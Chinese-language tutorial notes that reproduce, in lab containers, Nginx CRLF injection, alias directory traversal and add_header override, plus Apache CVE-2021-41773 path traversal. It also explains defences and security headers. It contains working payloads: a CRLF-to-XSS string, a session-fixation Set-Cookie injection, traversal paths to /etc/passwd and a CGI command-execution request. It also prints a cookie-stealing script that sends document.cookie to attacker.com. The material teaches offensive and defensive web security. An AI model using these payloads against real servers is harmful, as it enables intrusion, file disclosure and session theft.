# 中间件介绍

从客户端到数据库，中间经历的所有技术都可以称为**中间件**，狭义上主要指 Web 服务器和应用服务器

中间件和框架类漏洞每年爆出的数量不多，但一旦出现往往是大规模、高危的漏洞——Nginx 的市场占有率已超过 30%，一个 Nginx 漏洞就意味着全球三成网站处于危险状态

而且这些漏洞并不奇特，基本仍在 Web 十大漏洞范围内，只是实现流程和原理更复杂

本篇主线复现 Nginx 的三类配置错误漏洞（CRLF 注入、目录穿越、HTTP 响应头覆盖），并梳理 Nginx 解析漏洞与 Apache 解析漏洞；中间件概念辨析、各语言中间件对照、Nginx 程序自身漏洞等背景知识统一收入文末[扩展知识](#扩展知识)

#### CRLF 注入漏洞

##### 原理说明

CRLF 是 CR 和 LF 两个字符的拼接，分别代表"回车+换行"（\r\n），全称为 "Carriage Return/Line Feed"，十六进制编码分别为 0x0d 和 0x0a，URL 编码为 %0D 和 %0A。

CR 和 LF 组合在一起即 CRLF 命令，表示键盘上的 "Enter" 键，许多应用程序和网络协议使用它作为分隔符。

在 HTTP 协议中，HTTP Header 之间由一个 CRLF 字符序列分隔，HTTP Header 与 Body 用两个 CRLF 分隔，浏览器根据这两个 CRLF 取出 HTTP 内容并显示。

所以如果用户的输入在 HTTP 返回包的 Header 处回显，便可以通过 CRLF 提前结束响应头，在响应内容处注入攻击脚本。因此 CRLF Injection 又叫 **HTTP 响应拆分/截断**（HTTP Response Splitting，简称 HRS）。

`$uri` 是**解码后**的路径，所以 URL 里的 `%0a` 会变成真实换行符出现在 Location 响应头里，导致响应拆分。

可以在本地测试一下 CRLF 字符的作用：输入 `111%0d%0a222%0d%0a%0d%0a333`，能看到插入一个 CRLF 字符和两个 CRLF 字符的作用依次是换行和插入空行：

![image-20261104100048932](%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%AD%A5/image-20261104100048932.png)

CRLF 注入漏洞的本质和 XSS 有点相似：攻击者将恶意数据发送给易受攻击的 Web 应用程序，Web 应用程序将恶意数据输出在 HTTP 响应头中（XSS 一般输出在主体中）。

所以 CRLF 注入漏洞的检测也和 XSS 差不多——修改 HTTP 参数或 URL，注入恶意的 CRLF，查看构造的恶意数据是否在响应头中输出。

简单总结：通过回车换行符进行攻击注入，根据插入的 CRLF 个数不同，有**设置任意响应头**、**控制响应正文**两个主要利用办法。

具体危害表现在：控制响应头键值对、XSS 攻击、缓存病毒攻击、日志伪造等。

##### 漏洞分析

进入 Nginx 的 docker 容器中查看 Nginx 配置文件：

```bash
docker ps
docker exec -it <容器id> /bin/bash
cd /etc/nginx/conf.d
ls
cat error1.conf
```

配置如下：

```nginx
server {
        listen 8080;

        root /usr/share/nginx/html;

        index index.html;

        server_name _;

        location / {
                return 302 http://$host:$server_port$uri;
        }
}
```

其中 `location /` 作为前缀匹配，匹配所有以 `/` 开头的 URI：

| 请求 URI      | 是否匹配 `location /` |
| ------------- | --------------------- |
| `/`           | 匹配                  |
| `/index.html` | 匹配                  |
| `/abc`        | 匹配                  |
| `/abc/123`    | 匹配                  |
| `/api/user`   | 匹配                  |

因此访问其他 URI 仍然会进入 `location /`。如果只想让 `/` 触发 302，使用精确匹配 `location = /` 即可。

配合 `return 302 http://$host:$server_port$uri`，就进入了重定向的无限循环中。

> 重定向主要用于统一用户访问的域名或访问协议，或帮用户跳转到其他网址。

因为 `$uri` 和 `$document_uri` 是**解码后**的请求路径，可能包含换行符，从而造成 CRLF 注入漏洞：

![image-20261104103416782](%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%AD%A5/image-20261104103416782.png)

另一个相关问题：浏览器的 Filter（过滤器）是浏览器应对反射型 XSS 的保护策略，当 URL 中含有 XSS 相关特征时会过滤掉不显示，导致 XSS 无法触发。

用户侧一般无法关掉 Filter，只有当数据包中 HTTP 头含有 `X-XSS-Protection` 且值为 0 时，浏览器才不会开启 Filter。

而 HRS 正是注入 HTTP 头的漏洞——可以将 `X-XSS-Protection: 0` 注入数据包，再用两个 CRLF 注入 XSS 代码，从而绕过浏览器 Filter 执行反射型 XSS。

所以说 **HRS 的危害大于 XSS**，它能绕过一般 XSS 绕不过的浏览器 Filter。payload 如下：

```text
/%0aX-XSS-Protection:%200%0d%0a%0d%0a<img src=1 onerror=alert(/xss/)>
```

![image-20261104103456419](%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%AD%A5/image-20261104103456419.png)

##### 漏洞防御

1. 对用户数据进行合法性校验，对特殊字符进行编码，如 `<`、`>`、`'`、`"`、CR、LF 等；限制用户输入的 CR 和 LF，或者对 CR 和 LF 字符正确编码后再输出，防止注入自定义 HTTP 头
2. 创建安全字符白名单，只接受白名单中的字符出现在 HTTP 响应头中
3. 在将数据传送到 HTTP 响应头之前，删除所有的换行符

##### 扩展知识

###### 挖掘技巧

挖掘此类漏洞依旧要遵循亘古不变的原则：观察"输入"和"输出"的位置。对于 CRLF 则是观察返回的各种类型的协议头，挖掘分三步：

1. 观察输出是否在返回头中；查看输入，可能在 URL 值和参数、Cookie 头中。过往挖掘中最常见的两种情况，是使用输入参数创建 Cookie 和 302 跳转 Location 处
2. 提交 %0D%0A 字符，验证服务器是否响应 %0D%0A；若被过滤，可以通过双重编码绕过
3. 漏洞利用，使杀伤最大化：将漏洞转化为 HTML 注入、XSS、缓存攻击等

###### 会话固定（Session Fixation）

攻击者不偷你的会话 ID，而是**塞一个自己知道的 ID 给你**：

```text
① 攻击者先自己访问目标站，拿到一个合法会话 ID：JSESSIONID=jaden
   （这个 ID 攻击者完全掌握）

② 攻击者构造恶意链接发给受害者：
   https://靶场.com/%0aSet-cookie:JSPSESSID%3Djaden
        └─ %0a 是换行符，%3d 是等号

③ 受害者点开链接。Nginx 配置不当时，%0a 被解码成真正的回车换行，
   把 "Set-Cookie: JSESSIONID=jaden" 注入到响应头里，
   受害者浏览器乖乖把 jaden 存成 Cookie。  ← CRLF 漏洞在这里起作用

④ 受害者像往常一样登录网站。服务器把 jaden 这个会话绑定到受害者账号。

⑤ 攻击者在自己浏览器里把 Cookie 也设成 JSESSIONID=jaden，
   刷新页面 → 直接以受害者身份登录成功。
```

与会话劫持的对比：

|                   | 会话劫持（Hijacking） | 会话固定（Fixation）                                         |
| ----------------- | --------------------- | ------------------------------------------------------------ |
| 时机              | 登录**后**偷走 ID     | 登录**前**种入 ID                                            |
| 前提              | 需要 XSS、抓包嗅探等  | 只需一个能写入受害者 Cookie 的途径（CRLF、子域 Cookie 注入等） |
| 攻击者是否预知 ID | 偷到才知道            | 一开始就自己选好了                                           |

防御手段：

- **登录成功后重新生成会话 ID**（最有效，PHP 的 `session_regenerate_id()` 就是干这个的）——攻击者种的那个 ID 登录后就作废了
- 服务器不接受客户端自带的、未曾签发过的会话 ID
- 修复 Nginx 配置：重定向不要把未编码的 `$uri` 直接拼进去，或升级到已修复该问题的版本
- 会话与用户 IP、设备信息等做绑定校验作为辅助

###### HttpOnly 与 Cookie 安全属性

**HttpOnly 是设置在 Cookie 上的一个属性（标记）：这个 Cookie 只允许浏览器在发 HTTP 请求时自动携带，禁止 JavaScript 读取它。** 它防的是 XSS 偷 Cookie，但管不住"写入"Cookie。

为什么需要它——经典的会话劫持手法：网站有 XSS 漏洞，攻击者注入一段 JS：

```javascript
// 把受害者的 Cookie 发到攻击者的服务器
new Image().src = "https://attacker.com/steal?c=" + document.cookie;
```

如果会话 Cookie 没有 HttpOnly，这段脚本就能读到 `JSESSIONID`，攻击者拿到后直接冒充受害者登录。加了 HttpOnly 后，`document.cookie` 里看不到这个 Cookie，偷取脚本失效。注意 HttpOnly 不是修复 XSS，只是把 XSS 最有价值的战利品（会话 Cookie）锁起来了。

对应到两种攻击：

- **会话劫持**：需要**读**受害者的 Cookie → HttpOnly 能防
- **会话固定**：只需要**写入**一个攻击者选好的 Cookie → 靠 CRLF 注入、服务器响应头等服务端途径，根本不经过 JavaScript，HttpOnly 管不着

同理 HttpOnly 也不防 CSRF——浏览器发请求时照样自动带 Cookie，它只是不让 JS 看，不是不发送。

Cookie 的三个安全属性常一起出现：

- **HttpOnly**：防 JS 读取（针对 XSS 偷 Cookie）
- **Secure**：只允许通过 HTTPS 传输（防中间人嗅探明文 Cookie）
- **SameSite**：限制跨站请求时是否携带（针对 CSRF）

服务器配置会话 Cookie 的标准做法是三个都加上，各堵各的洞。

#### 目录穿越

##### 漏洞原理

目录穿越常见于 Nginx 做反向代理的情况：动态部分被 `proxy_pass` 传递给后端端口，而静态文件需要 Nginx 自己处理。假设静态文件存储在 `/home/` 目录下，而该目录在 URL 中的名字为 `files`，就需要用 `alias` 设置目录别名：

![image-20261104104659691](%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%AD%A5/image-20261104104659691.png)

此时访问 `http://example.com/files/readme.txt`，就可以获取 `/home/readme.txt` 文件。

漏洞成因：URL 上 `/files` 没有加后缀 `/`，而 `alias` 设置的 `/home/` 有后缀 `/`，这个差异导致可以从 `/home/` 目录穿越到它的上层目录。

#### HTTP Header头覆盖

##### 原理说明

Nginx 的安全配置策略，本质上是通过 `add_header` 在 HTTP **响应头**里塞几个"安全指令"，告诉浏览器：这个页面加载什么资源要限制、能不能被 iframe 嵌套、MIME 类型不要乱猜、强制走 HTTPS……

攻击手法大多靠浏览器"默认太宽容"（随便猜文件类型、随便执行内联脚本、随便被别的网站嵌套），这些头就是把浏览器的宽容开关一个个关掉。

它们不是修复漏洞，而是**纵深防御**——即使代码里有 XSS，这些头也能让攻击没法舒服地进行。各安全响应头详解见[扩展知识 · 安全响应头概览](#安全响应头概览)。

本节的漏洞点：在子级 location 中配置了 `add_header`，会导致父级 `add_header` 下发的安全响应头**整组失效**。

##### 漏洞原理

Nginx 指令按继承机制分两类：

- **标量指令**（`root`、`proxy_pass`）：子级没定义用父级的，定义了就覆盖，逐条生效
- **数组型指令**（`add_header`、`error_page`、`access_log`）：每层维护一个列表——当前层级列表为空则整体继承父级；不为空则只用当前层级，父级一律不看

源码层面就是一次整体指针替换，没有任何"逐条合并"逻辑。

为什么是覆盖：若默认追加，子级将无法移除父级加的头（只能加不能减）。整组覆盖给了子级完全控制权，代价是要自己把父级的头重写一遍。

**陷阱**：规则跨层级通用——`/test2` 里加一条 `add_header`，server 块、http 块的 CSP、XFO 等安全头在该 location 全部消失，响应里只剩 `X-Content-Type-Options: nosniff`。这是渗透测试中很常见的配置错误点。

##### 漏洞防御

**方案一：子级重复写全（最简单）**

```nginx
location = /test2 {
    add_header Content-Security-Policy "default-src 'self'";
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    rewrite ^(.*)$ /xss.html break;
}
```

**方案二：公共头抽成文件，include 复用（推荐）**

```nginx
# /etc/nginx/conf.d/security_headers.conf
add_header Content-Security-Policy "default-src 'self'";
add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;
server {
    include conf.d/security_headers.conf;

    location = /test2 {
        include conf.d/security_headers.conf;   # 子级重新引入，避免整组丢失
        add_header X-Custom test;
        rewrite ^(.*)$ /xss.html break;
    }
}
```

**方案三：用 headers-more 模块的 `more_set_headers`**

不受继承规则限制，任何层级直接追加/修改头，OpenResty 和 Tengine 自带，适合配置复杂、层级深的场景。

**方案四：安全头尽量放在 server / http 层级统一管理**

子 location 越多，"某处多写一条 add_header 导致局部失效"的风险越大，location 里少碰 `add_header`。

##### 扩展知识

###### 安全响应头概览

| 响应头                  | 防什么                      | 现状                                 |
| ----------------------- | --------------------------- | ------------------------------------ |
| X-Frame-Options         | 点击劫持 / iframe 嵌套      | 仍在用，CSP `frame-ancestors` 是后继 |
| X-Content-Type-Options  | MIME 嗅探导致的文件伪装执行 | 必加                                 |
| Content-Security-Policy | XSS、资源加载失控           | 最强力，现代核心                     |
| X-XSS-Protection        | 浏览器自带的 XSS 过滤       | 已废弃，可写可不写                   |
| HSTS                    | HTTPS 降级攻击              | 上了 HTTPS 就必加                    |
| Referrer-Policy         | Referer 隐私泄露            | 建议加                               |
| Permissions-Policy      | 敏感 Web API 滥用           | 建议加                               |

###### Content-Security-Policy（CSP）

CSP 是一种安全标准，通过限制网页资源的加载和执行来防止 XSS 等攻击。Nginx 中的配置示例：

```nginx
add_header Content-Security-Policy "default-src 'self'; img-src 'self' https://example.com; script-src 'self' 'sha256-真实的Base64哈希'; style-src 'self' 'sha256-真实的Base64哈希'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';" always;
```

| 指令                                 | 作用                                                         |
| ------------------------------------ | ------------------------------------------------------------ |
| `default-src 'self'`                 | 兜底策略：未单独声明的资源类型只允许同源加载                 |
| `img-src 'self' https://example.com` | 图片允许同源 + example.com                                   |
| `script-src 'self' 'sha256-...'`     | 脚本只允许外部同源文件 + 指定哈希的内联脚本                  |
| `style-src 'self' 'sha256-...'`      | 样式同上                                                     |
| `object-src 'none'`                  | 禁止 `<object>`、`<embed>`、`<applet>`                       |
| `frame-ancestors 'none'`             | 禁止任何网站 iframe 嵌套本页（等价于 XFO: DENY）             |
| `base-uri 'self'`                    | 限制 `<base>` 标签，防止篡改相对路径基准                     |
| `form-action 'self'`                 | 表单只能提交到同源地址                                       |
| `always`                             | `add_header` 默认只对部分状态码生效，错误页会丢头；加 `always` 保证全状态码下发 |

###### X-Frame-Options（XFO）

XFO 是响应上的"禁嵌令"：`DENY` 全拒、`SAMEORIGIN` 只许同源，专防**点击劫持**。现代替代品是 CSP 的 `frame-ancestors`（更强，支持多域名；官方建议两者同配，现代浏览器以 `frame-ancestors` 为准）。

通俗理解：防止自己的页面被别人 iframe 套走当道具。

#### Apache HTTP Server 2.4.49路径穿越漏洞（CVE-2021-41773）

##### 漏洞原理

在 Apache HTTP Server 2.4.49 版本中，在对用户发送的请求中的路径参数进行规范化时，其使用的 ap_normalize_path() 函数会对路径参数先进行 url 解码，然后判断是否存在 ../ 路径穿越符。

当检测到路径中存在 % 字符时，若其紧跟的两个字符是十六进制字符，则程序会对其进行 url 解码，将其 转换成标准字符，如 %2e 会被转换为 . 。若转换后的标准字符为 . ，此时程序会立即判断其后两字符是否 为 ./ ，从而判断是否存在未经允许的 ../ 路径穿越行为。

如果路径中存在 %2e./ 形式，程序就会检测到路径穿越符。然而，当出现 .%2e/ 或 %2e%2e/ 形式，程 序就不会将其检测为路径穿越符。原因是遍历到第一个 . 字符时，程序检测到其后两字符为 %2 而不是 ./ ，就不会将其判断为 ../ 。因此，攻击者可以使用 .%2e/ 或 %2e%2e/ 绕过程序对路径穿越符的检测，从 而读取位于 Apache 服务器 web 目录以外的其他文件，或者读取 web 目录中的脚本文件源码，或者在开 启了 cgi 或 cgid 的服务器上执行任意命令。本质上，这一漏洞属于代码层面的逻辑漏洞

https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773

```shell

cd httpd/CVE-2021-41773

export http_proxy="http://192.168.12.1:7890"
export https_proxy="http://192.168.12.1:7890"
```

> 为什么必须是 `/icons`？换成 `/aaa` 或其他为什么不行？为什么非得是访问一个资源之后，为什么不能直接 `ip:port/.%2e/%2e%2e/`？
>
> 首先，先看一下 `httpd-autoindex.conf` 配置：
>
> ```shell
> docker-compose ps -a
> docker exec -it cve-2021-41773-apache-1 /bin/bash
> cat /usr/local/apache2/conf/extra/httpd-autoindex.conf
> ```
>
> ```conf
> Alias /icons/ "/usr/local/apache2/icons/"
> 
> <Directory "/usr/local/apache2/icons">
>     Options Indexes MultiViews
>     AllowOverride None
>     Require all granted
> </Directory>
> ```
>
> 解读：
>
> | 配置项                | 含义                                           |
> | --------------------- | ---------------------------------------------- |
> | `Options Indexes`     | 允许目录索引；没有默认首页时，可以展示目录内容 |
> | `Options MultiViews`  | 启用内容协商，允许根据请求匹配相近的文件名     |
> | `AllowOverride None`  | 不允许该目录下的 `.htaccess` 覆盖主配置        |
> | `Require all granted` | 允许所有客户端通过 Apache 的授权检查           |
>
> 其中，最关键的 `Require all granted`，意味着：任何客户端都可以通过 Apache 对这个目录的授权检查，不需要特定 IP 或身份认证
>
> 而关于 `/aaa` 或其他入口，未看到对应的专门 Directory 授权
>
> 换 `/aaa` 行不行？
>
> 可以，但前提是 `/aaa/` 也配置了类似的 Alias 映射，并且对应目录的访问控制允许访问。不是 `/icons/` 这个名字有什么特殊性
>
> 上面算是半吊子的回答了为什么 `/aaa` 不行，而 `/icons` 行
>
> 但是为什么不直接 `ip:port/.%2e/%2e%2e/%2e%2e` 那？
>
> - `/.%2e/%2e%2e/%2e%2e/etc/passwd`
>   - 路径规范化存在漏洞，编码的 `..` 可以逃过检查。
>   - 但请求没有 `/icons/` 前缀，因此不会命中 `/icons/` 对应的 Alias。
>   - 它走的是普通 URI 到文件系统的映射路径，通常由 `DocumentRoot` 处理。
> - `/icons/.%2e/%2e%2e/%2e%2e/etc/passwd`
>   - 同样利用路径规范化缺陷。
>   - 但它先命中 `/icons/` Alias。
>   - 后续路径穿越可以使映射结果逃出 `/usr/local/apache2/icons/`。
>
> 总的来说，`.%2e` 绕过路径规范化检查，Alias 提供映射入口，访问控制决定最终能否读取目标文件



如果服务器开启CGI或cgid服 务，攻击者可进行任意代码执行：

- 修改请求方法为 `POST`
- 访问 uri 为 `/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh`
- command：`echo;id`

## 扩展知识

### 什么是中间件

从客户端一直到数据库，中间经历的技术都可以称之为**中间件**，所以中间件的概念很宽泛。如果细分的话，中间件主要指 **Web 服务器**和**应用服务器**。

多数应用服务器其实也能做 Web 服务器的事情，不过有些应用服务器自带的 Web 服务器功能略差，所以又有单独的 Web 服务器——不同的服务器各有自己专业要做的事情。Web 服务器又叫 WebServer、HTTP 服务器。

以 Java 语言开发的项目举例：

![1793623182582](%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%AD%A5/1793623182582.png)

### Web 服务器与应用服务器的区别

1. **Web 服务器**是一个基于 HTTP 协议的服务器软件。它主要用于**接收来自 Web 浏览器的请求，并向浏览器发送 HTML 和其他文件**。Web 服务器的主要职责是处理从浏览器发送的请求，处理 Web 页面、图像和其他文件的静态资源，并将它们返回给请求的浏览器。Web 服务器的示例包括 Apache HTTP Server、Microsoft IIS、Nginx 等
2. **应用服务器**为客户端提供对业务逻辑的访问。这种服务器**根据客户端的请求，将数据转换为动态内容**。比如打开个人微博的例子：需要应用服务器执行程序，从数据库中找到用户的最新微博信息，再把信息转换成 HTML 网页显示在客户面前。应用服务器一般也会提供数据库连接支持。应用服务器如 JSP，处理的是非常规性 Web 页面（JSP 文件），它动态生成 Web 页面并发送给客户端（实际上当应用服务器处理完一个 JSP 请求并完成 JSP 生成 HTML 后，它的任务就结束了，其余的就是 Web 服务器处理的过程了）
3. **Web 服务器一般是通用的，而应用服务器一般是专用的**。如 Tomcat 只处理 Java 应用程序而不能处理 ASPX 或 PHP；而 Apache 是一个 Web 服务器，可以用来连接 Tomcat 应用服务器来支持 Java 项目部署
4. Web 服务器包括 Nginx、Apache、IIS 等，应用服务器包括 WebLogic、JBoss 等。应用服务器一般也支持 HTTP 协议，因此界限没这么清晰。但是应用服务器的 HTTP 协议部分仅仅是支持，一般不会做特别优化，所以很少见 Tomcat 直接暴露给外面，而是和 Nginx、Apache 等配合，只让 Tomcat 处理 JSP 和 Servlet 部分
